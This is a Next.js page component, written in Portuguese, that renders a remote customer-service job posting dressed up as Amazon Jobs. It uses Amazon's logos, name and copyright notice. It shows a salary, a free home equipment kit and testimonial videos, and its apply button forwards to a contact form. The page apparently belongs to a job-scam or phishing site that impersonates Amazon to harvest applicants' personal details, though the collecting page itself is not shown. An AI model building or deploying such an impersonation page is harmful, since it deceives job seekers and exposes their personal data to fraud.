"use client";

import Image from "next/image";
import { useRouter } from "next/navigation";
import "./vagaDetalhe.css";

export default function VagaDetalhe() {
  const router = useRouter();

  // Mock de dados da vaga (pode vir de API ou props no futuro)
  const vaga = {
    id: "250120126",
    titulo: "Atendimento ao Cliente – Trabalho Remoto",
    local: "Virtual, Brazil",
    salario: "R$ 2.268,00/mês",
    tipo: "Período integral",
  };

  const handleCandidatar = () => {
    // Salva no localStorage para ser usado em /ApplicationContact
    localStorage.setItem("vagaSelecionada", JSON.stringify(vaga));

    // Redireciona
    router.push("/ApplicationContact");
  };

  return (
    <main className="vaga-detalhe">
      <header>
        <div className="navbar">
          {/* LOGO */}
          <div className="navbar-left">
            <Image
              src="/logo_dark.99265b07.svg"
              alt="Amazon Jobs"
              width={120}
              height={36}
              priority
            />
          </div>

          {/* LINKS CENTRALIZADOS */}
          <nav className="navbar-center">
            <a href="#como-funciona">Oportunidades de Emprego</a>
            <a href="#faq">Pesquisar todas as vagas</a>
            <a href="#">Começando</a>
            <a href="#">Minha conta</a>
          </nav>
        </div>
      </header>

  {/* HERO */}
      <section className="hero-vaga">
        <h1>Atendimento ao Cliente – Trabalho Remoto</h1>
        <p>
          Junte-se à equipe global de atendimento ao cliente da Amazon e
          ajude milhões de clientes todos os dias. Essa é uma função 100% online.
        </p>
      </section>

      {/* CARROSSEL DE FEEDBACKS */}
      <section className="feedbacks">
        <h2>O que nossos colaboradores dizem:</h2>
        <div className="carousel">
          <div className="video-card">
            <video controls>
              <source src="/VID_20250911_190416.mp4" type="video/mp4" />
            </video>
            <p>Giovanna Silva</p>
          </div>
          <div className="video-card">
            <video controls>
              <source src="/VID-20250911-WA0057.mp4" type="video/mp4" />
            </video>
            <p>Andrey Pereira</p>
          </div>
        </div>
      </section>

      {/* SOBRE A FUNÇÃO */}
      <section className="sobre">
        <h2>Sobre a Função</h2>
        <p>
          Como associado de atendimento ao cliente, você ajudará clientes via
          telefone, chat e e-mail. Essa é uma posição remota e você terá todo o
          suporte e treinamento para realizar seu trabalho com excelência.
        </p>
      </section>

      {/* HORÁRIOS */}
      <section className="horarios">
        <h2>Quais são os horários?</h2>
        <p>
          Esta função exige horários de trabalho que variam para coincidir com o
          momento em que os clientes mais precisam de nós. Você trabalhará em
          turnos diurnos e sua semana de trabalho é de no mínimo 36 horas.
        </p>
        <ul>
          <li>Funcionamento: 06h às 24h (Segunda a Domingo)</li>
          <li>Mínimo de 36 horas semanais</li>
          <li>Escalas incluem feriados nacionais</li>
          <li>Compensação legal garantida</li>
        </ul>
      </section>

      {/* EQUIPAMENTOS */}
      <section className="equipamentos">
        <h2>Equipamentos fornecidos</h2>
        <p>
          Se você for selecionado, receberá um kit completo para desempenhar
          suas atividades em casa:
        </p>
        <ul>
          <li>1 Lenovo Case + CPU</li>
          <li>1 Monitor Lenovo</li>
          <li>1 Teclado + Mouse</li>
          <li>1 Headset (audífonos)</li>
          <li>2 Zuckye</li>
        </ul>
        <p className="aviso">
          Certifique-se de que o endereço fornecido está correto para evitar
          atrasos na entrega do equipamento.
        </p>
      </section>

      {/* CTA FINAL */}
      <section className="cta-final">
        <h2>Pronto para se candidatar?</h2>
        <button onClick={handleCandidatar} className="btn-candidatar">
          Candidate-se agora →
        </button>
      </section>

      {/* FOOTER */}
      <footer className="footer">
        <div className="footer-social">
          <h4>Junte-se a nós agora</h4>
          <a href="#" aria-label="Facebook" className="social-link">
            <svg
              width="22"
              height="22"
              viewBox="0 0 448 512"
              fill="currentColor"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 
              37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 
              38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z" />
            </svg>
          </a>
        </div>

        <div className="footer-top">
          <div className="footer-col">
            <h4>OPORTUNIDADES DE EMPREGO</h4>
            <ul>
              <li>
                <a href="#">
                  Oportunidades em Centros de Distribuição e Estações de Entrega
                </a>
              </li>
              <li>
                <a href="#">Empregos de atendimento ao cliente</a>
              </li>
              <li>
                <a href="#">Procura de emprego</a>
              </li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>RECURSOS</h4>
            <ul>
              <li>
                <a href="#">Perguntas Frequentes</a>
              </li>
              <li>
                <a href="#">Fale Conosco</a>
              </li>
            </ul>
          </div>

          <div className="footer-logo">
            <Image
              src="/logo.92a0feec.svg"
              alt="Amazon Jobs"
              width={140}
              height={40}
            />
          </div>
        </div>

        <div className="footer-bottom">
          <p className="descricao">
            A Amazon está comprometida com um ambiente de trabalho diversificado
            e inclusivo. A Amazon é uma empregadora que oferece oportunidades
            iguais e não discrimina com base em raça, nacionalidade, sexo,
            identidade de gênero, orientação sexual, deficiência, idade ou outro
            status legalmente protegido.
          </p>

          <div className="footer-legal">
            <a href="#">Aviso de privacidade</a>
            <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
          </div>
        </div>
      </footer>
    </main>
  );
}
